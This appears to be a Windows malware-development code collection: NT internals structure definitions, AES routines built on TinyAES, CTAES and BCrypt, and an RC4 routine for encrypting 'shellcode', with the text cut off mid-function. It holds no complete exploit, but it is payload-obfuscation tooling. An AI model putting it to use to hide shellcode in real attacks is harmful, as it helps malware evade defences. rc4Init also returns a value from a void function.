### Structs.h
```c
#pragma once
#ifndef STRUCTS_H
#define STRUCTS_H

#include <Windows.h>

#define STATUS_SUCCESS	    0x00000000
#define NtCurrentProcess()  ( (HANDLE)-1 )
#define NtCurrentThread()   ( (HANDLE)-2 )
#define NT_SUCCESS(STATUS)	(((NTSTATUS)(STATUS)) >= STATUS_SUCCESS)

typedef struct _LSA_UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} LSA_UNICODE_STRING, * PLSA_UNICODE_STRING, UNICODE_STRING, * PUNICODE_STRING, * PUNICODE_STR;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define OBJ_INHERIT                         0x00000002L
#define OBJ_PERMANENT                       0x00000010L
#define OBJ_EXCLUSIVE                       0x00000020L
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define OBJ_OPENIF                          0x00000080L
#define OBJ_OPENLINK                        0x00000100L
#define OBJ_KERNEL_HANDLE                   0x00000200L
#define OBJ_FORCE_ACCESS_CHECK              0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP   0x00000800L
#define OBJ_DONT_REPARSE                    0x00001000L
#define OBJ_VALID_ATTRIBUTES                0x00001FF2L

#define InitializeObjectAttributes( p, n, a, r, s ) {   \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

typedef enum _SECTION_INHERIT {
    ViewShare = 1,
    ViewUnmap = 2
} SECTION_INHERIT, * PSECTION_INHERIT;

typedef struct _IO_STATUS_BLOCK
{
	union
	{
		NTSTATUS Status;
		PVOID Pointer;
	};
	ULONG_PTR Information;
} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;

typedef struct _PS_ATTRIBUTE
{
	ULONG_PTR Attribute;
	SIZE_T Size;
	union
	{
		ULONG_PTR Value;
		PVOID ValuePtr;
	};
	PSIZE_T ReturnLength;

} PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST
{
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[3];

} PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;


// Create disposition

#define FILE_SUPERSEDE                      0x00000000
#define FILE_OPEN                           0x00000001
#define FILE_CREATE                         0x00000002
#define FILE_OPEN_IF                        0x00000003
#define FILE_OVERWRITE                      0x00000004
#define FILE_OVERWRITE_IF                   0x00000005
#define FILE_MAXIMUM_DISPOSITION            0x00000005

// Create/open flags

#define FILE_DIRECTORY_FILE                 0x00000001
#define FILE_WRITE_THROUGH                  0x00000002
#define FILE_SEQUENTIAL_ONLY                0x00000004
#define FILE_NO_INTERMEDIATE_BUFFERING      0x00000008

#define FILE_SYNCHRONOUS_IO_ALERT           0x00000010
#define FILE_SYNCHRONOUS_IO_NONALERT        0x00000020
#define FILE_NON_DIRECTORY_FILE             0x00000040
#define FILE_CREATE_TREE_CONNECTION         0x00000080

#if (PHNT_VERSION >= PHNT_REDSTONE5)
#define TREE_CONNECT_NO_CLIENT_BUFFERING    0x00000008
#define TREE_CONNECT_WRITE_THROUGH          0x00000002
#endif

#define FILE_COMPLETE_IF_OPLOCKED           0x00000100
#define FILE_NO_EA_KNOWLEDGE                0x00000200
#define FILE_OPEN_REMOTE_INSTANCE           0x00000400
#define FILE_RANDOM_ACCESS                  0x00000800

#define FILE_DELETE_ON_CLOSE                0x00001000
#define FILE_OPEN_BY_FILE_ID                0x00002000
#define FILE_OPEN_FOR_BACKUP_INTENT         0x00004000
#define FILE_NO_COMPRESSION                 0x00008000

#if (PHNT_VERSION >= PHNT_WIN7)
#define FILE_OPEN_REQUIRING_OPLOCK          0x00010000
#define FILE_DISALLOW_EXCLUSIVE             0x00020000
#endif
#if (PHNT_VERSION >= PHNT_WIN8)
#define FILE_SESSION_AWARE                  0x00040000
#endif

#define FILE_RESERVE_OPFILTER               0x00100000
#define FILE_OPEN_REPARSE_POINT             0x00200000
#define FILE_OPEN_NO_RECALL                 0x00400000
#define FILE_OPEN_FOR_FREE_SPACE_QUERY      0x00800000


#ifndef PIO_APC_ROUTINE_DEFINED
typedef
VOID
(NTAPI* PIO_APC_ROUTINE) (
	IN PVOID ApcContext,
	IN PIO_STATUS_BLOCK IoStatusBlock,
	IN ULONG Reserved
	);
#define PIO_APC_ROUTINE_DEFINED
#endif  // PIO_APC_ROUTINE_DEFINED

typedef enum _FILE_INFORMATION_CLASS
{
	FileDirectoryInformation = 1,
	FileFullDirectoryInformation,   // 2
	FileBothDirectoryInformation,   // 3
	FileBasicInformation,           // 4  wdm
	FileStandardInformation,        // 5  wdm
	FileInternalInformation,        // 6
	FileEaInformation,              // 7
	FileAccessInformation,          // 8
	FileNameInformation,            // 9
	FileRenameInformation,          // 10
	FileLinkInformation,            // 11
	FileNamesInformation,           // 12
	FileDispositionInformation,     // 13
	FilePositionInformation,        // 14 wdm
	FileFullEaInformation,          // 15
	FileModeInformation,            // 16
	FileAlignmentInformation,       // 17
	FileAllInformation,             // 18
	FileAllocationInformation,      // 19
	FileEndOfFileInformation,       // 20 wdm
	FileAlternateNameInformation,   // 21
	FileStreamInformation,          // 22
	FilePipeInformation,            // 23
	FilePipeLocalInformation,       // 24
	FilePipeRemoteInformation,      // 25
	FileMailslotQueryInformation,   // 26
	FileMailslotSetInformation,     // 27
	FileCompressionInformation,     // 28
	FileObjectIdInformation,        // 29
	FileCompletionInformation,      // 30
	FileMoveClusterInformation,     // 31
	FileQuotaInformation,           // 32
	FileReparsePointInformation,    // 33
	FileNetworkOpenInformation,     // 34
	FileAttributeTagInformation,    // 35
	FileTrackingInformation,        // 36
	FileIdBothDirectoryInformation, // 37
	FileIdFullDirectoryInformation, // 38
	FileValidDataLengthInformation, // 39
	FileShortNameInformation,       // 40
	FileIoCompletionNotificationInformation, // 41
	FileIoStatusBlockRangeInformation,       // 42
	FileIoPriorityHintInformation,           // 43
	FileSfioReserveInformation,              // 44
	FileSfioVolumeInformation,               // 45
	FileHardLinkInformation,                 // 46
	FileProcessIdsUsingFileInformation,      // 47
	FileMaximumInformation                   // 48
} FILE_INFORMATION_CLASS, * PFILE_INFORMATION_CLASS;



typedef enum _PROCESSINFOCLASS {
	ProcessBasicInformation,
	ProcessQuotaLimits,
	ProcessIoCounters,
	ProcessVmCounters,
	ProcessTimes,
	ProcessBasePriority,
	ProcessRaisePriority,
	ProcessDebugPort,
	ProcessExceptionPort,
	ProcessAccessToken,
	ProcessLdtInformation,
	ProcessLdtSize,
	ProcessDefaultHardErrorMode,
	ProcessIoPortHandlers,          // Note: this is kernel mode only
	ProcessPooledUsageAndLimits,
	ProcessWorkingSetWatch,
	ProcessUserModeIOPL,
	ProcessEnableAlignmentFaultFixup,
	ProcessPriorityClass,
	ProcessWx86Information,
	ProcessHandleCount,
	ProcessAffinityMask,
	ProcessPriorityBoost,
	ProcessDeviceMap,
	ProcessSessionInformation,
	ProcessForegroundInformation,
	ProcessWow64Information,
	ProcessImageFileName,
	ProcessLUIDDeviceMapsEnabled,
	ProcessBreakOnTermination,
	ProcessDebugObjectHandle,
	ProcessDebugFlags,
	ProcessHandleTracing,
	MaxProcessInfoClass                             // MaxProcessInfoClass should always be the last enum
} PROCESSINFOCLASS;



#define RTL_USER_PROC_PARAMS_NORMALIZED			0x00000001
#define RTL_USER_PROC_PROFILE_USER				0x00000002
#define RTL_USER_PROC_PROFILE_KERNEL			0x00000004
#define RTL_USER_PROC_PROFILE_SERVER			0x00000008
#define RTL_USER_PROC_RESERVE_1MB				0x00000020
#define RTL_USER_PROC_RESERVE_16MB				0x00000040
#define RTL_USER_PROC_CASE_SENSITIVE			0x00000080
#define RTL_USER_PROC_DISABLE_HEAP_DECOMMIT		0x00000100
#define RTL_USER_PROC_DLL_REDIRECTION_LOCAL		0x00001000
#define RTL_USER_PROC_APP_MANIFEST_PRESENT		0x00002000
#define RTL_USER_PROC_IMAGE_KEY_MISSING			0x00004000
#define RTL_USER_PROC_OPTIN_PROCESS				0x00020000


#define PS_REQUEST_BREAKAWAY                    1
#define PS_NO_DEBUG_INHERIT                     2
#define PS_INHERIT_HANDLES                      4
#define PS_LARGE_PAGES                          8
#define PS_ALL_FLAGS                            (PS_REQUEST_BREAKAWAY | PS_NO_DEBUG_INHERIT  | PS_INHERIT_HANDLES   | PS_LARGE_PAGES)

typedef struct _FILE_DISPOSITION_INFORMATION {
	BOOLEAN DeleteFile;
} FILE_DISPOSITION_INFORMATION, * PFILE_DISPOSITION_INFORMATION;

typedef struct _FILE_POSITION_INFORMATION {
	LARGE_INTEGER CurrentByteOffset;
} FILE_POSITION_INFORMATION, * PFILE_POSITION_INFORMATION;

typedef struct _FILE_END_OF_FILE_INFORMATION {
	LARGE_INTEGER EndOfFile;
} FILE_END_OF_FILE_INFORMATION, * PFILE_END_OF_FILE_INFORMATION;

#define RTL_MAX_DRIVE_LETTERS 32

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
	USHORT Flags;
	USHORT Length;
	ULONG TimeStamp;
	UNICODE_STRING DosPath;

} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _CURDIR
{
	UNICODE_STRING DosPath;
	HANDLE Handle;

} CURDIR, * PCURDIR;

typedef LONG KPRIORITY;

typedef struct _BASE_RELOCATION_ENTRY {
	WORD	Offset : 12;
	WORD	Type : 4;
} BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;


typedef struct _RTL_USER_PROCESS_PARAMETERS
{
	ULONG MaximumLength;
	ULONG Length;

	ULONG Flags;
	ULONG DebugFlags;

	HANDLE ConsoleHandle;
	ULONG ConsoleFlags;
	HANDLE StandardInput;
	HANDLE StandardOutput;
	HANDLE StandardError;

	CURDIR CurrentDirectory;
	UNICODE_STRING DllPath;
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
	PWCHAR Environment;

	ULONG StartingX;
	ULONG StartingY;
	ULONG CountX;
	ULONG CountY;
	ULONG CountCharsX;
	ULONG CountCharsY;
	ULONG FillAttribute;

	ULONG WindowFlags;
	ULONG ShowWindowFlags;
	UNICODE_STRING WindowTitle;
	UNICODE_STRING DesktopInfo;
	UNICODE_STRING ShellInfo;
	UNICODE_STRING RuntimeData;
	RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

	ULONG_PTR EnvironmentSize;
	ULONG_PTR EnvironmentVersion;
	PVOID PackageDependencyData;
	ULONG ProcessGroupId;
	ULONG LoaderThreads;

} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;



typedef struct _LDR_MODULE {
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
	PVOID                   BaseAddress;
	PVOID                   EntryPoint;
	ULONG                   SizeOfImage;
	UNICODE_STRING          FullDllName;
	UNICODE_STRING          BaseDllName;
	ULONG                   Flags;
	SHORT                   LoadCount;
	SHORT                   TlsIndex;
	LIST_ENTRY              HashTableEntry;
	ULONG                   TimeDateStamp;
} LDR_MODULE, * PLDR_MODULE;

typedef struct _PEB_LDR_DATA {
	ULONG                   Length;
	ULONG                   Initialized;
	PVOID                   SsHandle;
	LIST_ENTRY              InLoadOrderModuleList;
	LIST_ENTRY              InMemoryOrderModuleList;
	LIST_ENTRY              InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _PEB {
	BOOLEAN                 InheritedAddressSpace;
	BOOLEAN                 ReadImageFileExecOptions;
	BOOLEAN                 BeingDebugged;
	BOOLEAN                 Spare;
	HANDLE                  Mutant;
	PVOID                   ImageBase;
	PPEB_LDR_DATA           LoaderData;
	PRTL_USER_PROCESS_PARAMETERS                   ProcessParameters;
	PVOID                   SubSystemData;
	PVOID                   ProcessHeap;
	PVOID                   FastPebLock;
	PVOID                   FastPebLockRoutine;
	PVOID                   FastPebUnlockRoutine;
	ULONG                   EnvironmentUpdateCount;
	PVOID* KernelCallbackTable;
	PVOID                   EventLogSection;
	PVOID                   EventLog;
	PVOID                   FreeList;
	ULONG                   TlsExpansionCounter;
	PVOID                   TlsBitmap;
	ULONG                   TlsBitmapBits[0x2];
	PVOID                   ReadOnlySharedMemoryBase;
	PVOID                   ReadOnlySharedMemoryHeap;
	PVOID* ReadOnlyStaticServerData;
	PVOID                   AnsiCodePageData;
	PVOID                   OemCodePageData;
	PVOID                   UnicodeCaseTableData;
	ULONG                   NumberOfProcessors;
	ULONG                   NtGlobalFlag;
	BYTE                    Spare2[0x4];
	LARGE_INTEGER           CriticalSectionTimeout;
	ULONG                   HeapSegmentReserve;
	ULONG                   HeapSegmentCommit;
	ULONG                   HeapDeCommitTotalFreeThreshold;
	ULONG                   HeapDeCommitFreeBlockThreshold;
	ULONG                   NumberOfHeaps;
	ULONG                   MaximumNumberOfHeaps;
	PVOID** ProcessHeaps;
	PVOID                   GdiSharedHandleTable;
	PVOID                   ProcessStarterHelper;
	PVOID                   GdiDCAttributeList;
	PVOID                   LoaderLock;
	ULONG                   OSMajorVersion;
	ULONG                   OSMinorVersion;
	ULONG                   OSBuildNumber;
	ULONG                   OSPlatformId;
	ULONG                   ImageSubSystem;
	ULONG                   ImageSubSystemMajorVersion;
	ULONG                   ImageSubSystemMinorVersion;
	ULONG                   GdiHandleBuffer[0x22];
	ULONG                   PostProcessInitRoutine;
	ULONG                   TlsExpansionBitmap;
	BYTE                    TlsExpansionBitmapBits[0x80];
	ULONG                   SessionId;
} PEB, * PPEB;


typedef struct _PROCESS_BASIC_INFORMATION
{
	NTSTATUS ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	KPRIORITY BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;

} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;


#endif // !STRUCTS_H
```
### AES Decryption Using The Tiny-AES Library
```c
#include "TinyAES.h"
#include <windows.h>
#include <stdio.h>
BOOL InstallAesDecryptionViaTinyAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv) {

	struct	AES_ctx AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !pAesKey || !pAesIv)
		return FALSE;

	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
	AES_CBC_decrypt_buffer(&AesCtx, pCipherTextBuffer, sCipherTextSize);

	return TRUE;
}
```
### AES Encryption Using The Tiny-AES Library
```c
#include "TinyAES.h"
#include <windows.h>
#include <stdio.h>
BOOL InstallAesEncryptionViaTinyAes(IN PBYTE pRawDataBuffer, IN SIZE_T sRawBufferSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppCipherTextBuffer, OUT SIZE_T* psCipherTextSize) {

	if (!pRawDataBuffer || !sRawBufferSize || !pAesKey || !pAesIv || !ppCipherTextBuffer || !psCipherTextSize)
		return FALSE;

	PBYTE	pNewBuffer		= pRawDataBuffer;
	SIZE_T	sNewBufferSize	= sRawBufferSize;
	struct	AES_ctx AesCtx	= { 0x00 };

	if (sRawBufferSize % 16 != 0x00) {

		sNewBufferSize		= sRawBufferSize + 16 - (sRawBufferSize % 16);
		pNewBuffer			= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewBufferSize);

		if (!pNewBuffer) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewBuffer, pRawDataBuffer, sRawBufferSize);
	}

	RtlSecureZeroMemory(&AesCtx, sizeof(AesCtx));
	AES_init_ctx_iv(&AesCtx, pAesKey, pAesIv);
	AES_CBC_encrypt_buffer(&AesCtx, pNewBuffer, sNewBufferSize);

	*psCipherTextSize	= sNewBufferSize;
	*ppCipherTextBuffer = pNewBuffer;

	return TRUE;
}
```
### AES Decryption Using WinAPIs
```c
#include <Bcrypt.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "Bcrypt.lib")

#define NT_SUCCESS(STATUS)	(((NTSTATUS)(STATUS)) >= 0x00)
#define AES_KEY_SIZE		32
#define AES_IV_SIZE			16

BOOL InstallAesDecryption(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppRawBuffer, OUT PSIZE_T psRawBufferSize) {

	NTSTATUS				STATUS				= 0x00;

	ULONG       			cbResult			= NULL;
	BCRYPT_ALG_HANDLE		hAlgorithm			= NULL;
	BCRYPT_KEY_HANDLE		hKeyHandle			= NULL;
	DWORD       			dwBlockSize			= 0x00;
	DWORD       			dwKeyObjectLength	= 0x00;
	PBYTE       			pKeyObjectBuff		= NULL;

	PBYTE      				pTmpRawBuff			= NULL;
	DWORD       			dwTmpRawSize		= 0x00;

	if (!NT_SUCCESS((STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0x00)))) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&dwKeyObjectLength, sizeof(DWORD), &cbResult, 0x00)))) {
		printf("[!] BCryptGetProperty [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0x00)))) {
		printf("[!] BCryptGetProperty [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (dwBlockSize != AES_IV_SIZE)
		goto _END_OF_FUNC;

	if (!(pKeyObjectBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwKeyObjectLength))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0x00)))) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pKeyObjectBuff, dwKeyObjectLength, (PUCHAR)pAesKey, AES_KEY_SIZE, 0x00)))) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pCipherTextBuffer, (ULONG)sCipherTextSize, NULL, pAesIv, AES_IV_SIZE, NULL, 0x00, &dwTmpRawSize, BCRYPT_BLOCK_PADDING)))) {
		printf("[!] BCryptDecrypt [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (!(pTmpRawBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTmpRawSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptDecrypt(hKeyHandle, (PUCHAR)pCipherTextBuffer, (ULONG)sCipherTextSize, NULL, pAesIv, AES_IV_SIZE, pTmpRawBuff, dwTmpRawSize, &cbResult, BCRYPT_BLOCK_PADDING)))) {
		printf("[!] BCryptDecrypt [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	*ppRawBuffer		= pTmpRawBuff;
	*psRawBufferSize	= dwTmpRawSize;

_END_OF_FUNC:
	if (hKeyHandle)
		BCryptDestroyKey(hKeyHandle);
	if (hAlgorithm)
		BCryptCloseAlgorithmProvider(hAlgorithm, 0x00);
	if (pKeyObjectBuff)
		HeapFree(GetProcessHeap(), 0x00, pKeyObjectBuff);
	if (pTmpRawBuff && !*ppRawBuffer)
		HeapFree(GetProcessHeap(), 0x00, pTmpRawBuff);
	return (*ppRawBuffer && *psRawBufferSize) ? TRUE : FALSE;
}
```
### AES Decryption Using The CTAES Library 
```c
#include "CtAes.h"
#include <windows.h>
#include <stdio.h>

BOOL InstallAesDecryptionViaCtAes(IN PBYTE pCipherTextBuffer, IN SIZE_T sCipherTextSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppPlainTextBuffer) {

	AES256_CBC_ctx	AesCtx = { 0x00 };

	if (!pCipherTextBuffer || !sCipherTextSize || !ppPlainTextBuffer || !pAesKey || !pAesIv)
		return FALSE;

	if (!(*ppPlainTextBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sCipherTextSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
	AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
	AES256_CBC_decrypt(&AesCtx, (sCipherTextSize / 16), *ppPlainTextBuffer, pCipherTextBuffer);

	return TRUE;
}
```
### AES Encryption Using The CTAES Library
```c
#include "CtAes.h"
#include <windows.h>
#include <stdio.h>

BOOL InstallAesEncryptionViaCtAes(IN PBYTE pRawDataBuffer, IN SIZE_T sRawBufferSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppCipherTextBuffer, OUT SIZE_T* psCipherTextSize) {

	if (!pRawDataBuffer || !sRawBufferSize || !ppCipherTextBuffer || !psCipherTextSize || !pAesKey || !pAesIv)
		return FALSE;

	PBYTE			pNewBuffer		= pRawDataBuffer,
					pTmpCipherBuff	= NULL;
	SIZE_T			sNewBufferSize	= sRawBufferSize;
	AES256_CBC_ctx	AesCtx			= { 0x00 };

	if (sRawBufferSize % 16 != 0x00) {

		sNewBufferSize	= sRawBufferSize + 16 - (sRawBufferSize % 16);
		pNewBuffer		= HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewBufferSize);

		if (!pNewBuffer) {
			printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
			return FALSE;
		}

		memcpy(pNewBuffer, pRawDataBuffer, sRawBufferSize);
	}

	if (!(pTmpCipherBuff = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sNewBufferSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		return FALSE;
	}

	RtlSecureZeroMemory(&AesCtx, sizeof(AES256_CBC_ctx));
	AES256_CBC_init(&AesCtx, pAesKey, pAesIv);
	AES256_CBC_encrypt(&AesCtx, (sNewBufferSize / 16), pTmpCipherBuff, pNewBuffer);

	*ppCipherTextBuffer		= pTmpCipherBuff;
	*psCipherTextSize		= sNewBufferSize;

	return TRUE;
}
```
### AES Encryption Using WinAPIs
```c
#include <Bcrypt.h>
#pragma comment(lib, "Bcrypt.lib")
#include <windows.h>
#include <stdio.h>

#define NT_SUCCESS(STATUS)	(((NTSTATUS)(STATUS)) >= 0x00)
#define AES_KEY_SIZE		32
#define AES_IV_SIZE			16

BOOL InstallAesEncryption(IN PBYTE pRawBuffer, IN SIZE_T sRawBufferSize, IN PBYTE pAesKey, IN PBYTE pAesIv, OUT PBYTE* ppCipherTextBuffer, OUT PSIZE_T psCipherTextSize) {

	NTSTATUS				STATUS					= 0x00;

	ULONG       			cbResult				= NULL;
	BCRYPT_ALG_HANDLE		hAlgorithm				= NULL;
	BCRYPT_KEY_HANDLE		hKeyHandle				= NULL;
	DWORD       			dwBlockSize				= 0x00;
	DWORD       			dwKeyObjectLength		= 0x00;
	PBYTE       			pKeyObjectBuff			= NULL;

	PBYTE      				pTmpCipherTxtBuff		= NULL;
	DWORD       			dwTmpCipherTxtSize		= 0x00;

	if (!NT_SUCCESS((STATUS = BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_AES_ALGORITHM, NULL, 0x00)))) {
		printf("[!] BCryptOpenAlgorithmProvider Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_OBJECT_LENGTH, (PBYTE)&dwKeyObjectLength, sizeof(DWORD), &cbResult, 0x00)))) {
		printf("[!] BCryptGetProperty [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptGetProperty(hAlgorithm, BCRYPT_BLOCK_LENGTH, (PBYTE)&dwBlockSize, sizeof(DWORD), &cbResult, 0x00)))) {
		printf("[!] BCryptGetProperty [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (dwBlockSize != AES_IV_SIZE)
		goto _END_OF_FUNC;

	if (!(pKeyObjectBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwKeyObjectLength))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptSetProperty(hAlgorithm, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0x00)))) {
		printf("[!] BCryptSetProperty Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptGenerateSymmetricKey(hAlgorithm, &hKeyHandle, pKeyObjectBuff, dwKeyObjectLength, (PUCHAR)pAesKey, AES_KEY_SIZE, 0x00)))) {
		printf("[!] BCryptGenerateSymmetricKey Failed With Error: 0x%0.8X \n", STATUS);
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pRawBuffer, (ULONG)sRawBufferSize, NULL, pAesIv, AES_IV_SIZE, NULL, 0x00, &dwTmpCipherTxtSize, BCRYPT_BLOCK_PADDING)))) {
		printf("[!] BCryptEncrypt [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	if (!(pTmpCipherTxtBuff = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwTmpCipherTxtSize))) {
		printf("[!] HeapAlloc Failed With Error: %d \n", GetLastError());
		goto _END_OF_FUNC;
	}

	if (!NT_SUCCESS((STATUS = BCryptEncrypt(hKeyHandle, (PUCHAR)pRawBuffer, (ULONG)sRawBufferSize, NULL, pAesIv, AES_IV_SIZE, pTmpCipherTxtBuff, dwTmpCipherTxtSize, &cbResult, BCRYPT_BLOCK_PADDING)))) {
		printf("[!] BCryptEncrypt [%d] Failed With Error: 0x%0.8X \n", __LINE__, STATUS);
		goto _END_OF_FUNC;
	}

	*ppCipherTextBuffer = pTmpCipherTxtBuff;
	*psCipherTextSize	= dwTmpCipherTxtSize;

_END_OF_FUNC:
	if (hKeyHandle)
		BCryptDestroyKey(hKeyHandle);
	if (hAlgorithm)
		BCryptCloseAlgorithmProvider(hAlgorithm, 0x00);
	if (pKeyObjectBuff)
		HeapFree(GetProcessHeap(), 0x00, pKeyObjectBuff);
	if (pTmpCipherTxtBuff && !*ppCipherTextBuffer)
		HeapFree(GetProcessHeap(), 0x00, pTmpCipherTxtBuff);
	return (*ppCipherTextBuffer && *psCipherTextSize) ? TRUE : FALSE;
}
```
### RC4 Encryption & Decryption Via a Custom RC4 Algorithm
```c
#include <windows.h>
#include <stdio.h>

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;

void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	context->i = 0;
	context->j = 0;

	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	for (i = 0, j = 0; i < 256; i++)
	{
		j = (j + context->s[i] + key[i % length]) % 256;

		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}

void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	while (length > 0)
	{
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		if (input != NULL && output != NULL)
		{
			*output = *input ^ s[(s[i] + s[j]) % 256];
			input++;
			output++;
		}

		length--;
	}

	context->i = i;
	context->j = j;
}

PBYTE CustomRC4EncryptDecrypt(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE pbKey, IN SIZE_T sKeySize) {

	Rc4Context		RC4Ctx			= { 0 };
	PBYTE			pOtptBuffer		= NULL;

	if (!pShellcode || !sShellcodeSize || !pbKey || !sKeySize)
		return NULL;

